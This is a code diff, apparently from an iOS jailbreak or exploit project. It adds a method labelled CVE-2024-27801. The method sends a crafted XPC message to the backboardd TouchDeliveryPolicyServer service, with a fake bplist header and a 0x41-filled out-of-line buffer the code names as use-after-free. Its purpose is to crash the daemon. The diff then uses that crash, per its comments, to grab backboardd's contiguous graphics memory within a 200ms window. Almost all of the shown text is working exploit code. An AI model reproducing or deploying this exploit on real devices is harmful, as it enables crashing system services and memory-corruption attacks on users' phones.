@@ -776,10 +776,37 @@ void *boomerang_server(struct boomerang_info *info)
     return 0;
 }
 
+- (int)crashBackboardd_15
+{
+    // CVE-2024-27801
+    xpc_connection_t (*haxx_xpc_connection_create_mach_service)(const char *, dispatch_queue_t, uint64_t) = dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
+    if (!haxx_xpc_connection_create_mach_service) {
+        return -1;
+    }
+    xpc_connection_t client = haxx_xpc_connection_create_mach_service("com.apple.backboard.TouchDeliveryPolicyServer", NULL, 0);
+    xpc_connection_set_event_handler(client, ^(xpc_object_t event) {});
+    xpc_connection_resume(client);
+    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
+    uint8_t root[1024] = { 0 };
+    memcpy(root, "bplist17", strlen("bplist17"));
+    xpc_dictionary_set_data(message, "root",root, 1024);
+    xpc_dictionary_set_uint64(message, "proxynum", 1);
+    xpc_dictionary_set_uint64(message, "inv", 1);
+    uint8_t uaf_xpc[1024];
+    memset(uaf_xpc, 0x41, 1024);
+    xpc_dictionary_set_value(message, "ool", xpc_data_create(uaf_xpc, 1024));
+    xpc_connection_send_message_with_reply_sync(client, message);
+    return 0;
+}
+
 - (void)applyContiguousMappingWorkaround
 {
-    [self crashBackboardd];
-    
+    if (@available(iOS 16.0, *)) {
+        [self crashBackboardd];
+    }
+    else {
+        [self crashBackboardd_15];
+    }
     // After backboardd has crashed, we have about 200ms until the new backboardd kills our app
     // In this timeframe we need to steal it's contiguous PurpleGfxMem allocation
     IOSurfaceRef surface = NULL;
